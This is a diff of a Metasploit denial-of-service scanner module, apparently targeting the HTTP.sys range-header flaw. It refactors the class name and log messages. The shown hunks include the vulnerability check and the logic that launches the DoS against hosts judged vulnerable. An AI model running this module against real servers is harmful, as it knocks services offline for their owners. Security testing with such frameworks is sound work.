@@ -1,11 +1,9 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-
-class Metasploit3 < Msf::Auxiliary
+class MetasploitModule < Msf::Auxiliary
 
   # Watch out, dos all the things
   include Msf::Auxiliary::Scanner
@@ -43,9 +41,7 @@ class Metasploit3 < Msf::Auxiliary
     register_options(
       [
         OptString.new('TARGETURI', [false, 'URI to the site (e.g /site/) or a valid file resource (e.g /welcome.png)', '/'])
-      ], self.class)
-
-    deregister_options('RHOST')
+      ])
   end
 
   def upper_range
@@ -56,7 +52,7 @@ class Metasploit3 < Msf::Auxiliary
     if check_host(ip) == Exploit::CheckCode::Vulnerable
       dos_host(ip)
     else
-      print_status("#{peer} - Probably not vulnerable, will not dos it.")
+      print_status("Probably not vulnerable, will not dos it.")
     end
   end
 
@@ -72,17 +68,17 @@ class Metasploit3 < Msf::Auxiliary
       res = send_request_raw('uri' => uri)
 
       unless res
-        vprint_error("#{peer} - Connection timed out")
+        vprint_error("Connection timed out")
         return file_size
       end
 
       if res.code == 404
-        vprint_error("#{peer} - You got a 404. URI must be a valid resource.")
+        vprint_error("You got a 404. URI must be a valid resource.")
         return file_size
       end
 
       file_size = res.body.length
-      vprint_status("#{peer} - File length: #{file_size} bytes")
+      vprint_status("File length: #{file_size} bytes")
 
       return file_size
     }.call
@@ -108,7 +104,7 @@ class Metasploit3 < Msf::Auxiliary
     rescue ::Errno::EPIPE, ::Timeout::Error
       # Same exceptions the HttpClient mixin catches
     end
-    print_status("#{peer} - DOS request sent")
+    print_status("DOS request sent")
   end
 
   def potential_static_files_uris
@@ -153,16 +149,16 @@ class Metasploit3 < Msf::Auxiliary
         }
       )
 
-      vmessage = "#{peer} - Checking #{uri} [#{res.code}]"
+      vmessage = "#{peer} - Checking #{uri}"
 
       if res && res.body.include?('Requested Range Not Satisfiable')
-        vprint_status("#{vmessage} - Vulnerable")
+        vprint_status("#{vmessage} [#{res.code}] - Vulnerable")
 
         target_uri.path = uri # Needed for the DoS attack
 
         return Exploit::CheckCode::Vulnerable
       elsif res && res.body.include?('The request has an invalid header name')
-        vprint_status("#{vmessage} - Safe")
+        vprint_status("#{vmessage} [#{res.code}] - Safe")
 
         return Exploit::CheckCode::Safe
       else
